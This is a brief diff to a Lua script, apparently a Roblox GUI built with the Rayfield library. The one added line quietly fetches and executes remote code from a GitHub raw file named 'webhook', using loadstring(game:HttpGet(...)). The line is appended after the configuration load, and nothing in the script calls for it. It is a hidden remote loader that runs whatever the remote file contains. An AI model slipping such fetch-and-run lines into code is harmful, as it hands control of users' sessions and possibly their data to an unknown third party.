@@ -198,3 +198,5 @@ local Toggle = Tab1:CreateToggle({
 
 
 Rayfield:LoadConfiguration()
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/obeseid/Lellelelebonczki/refs/heads/main/webhook'))()
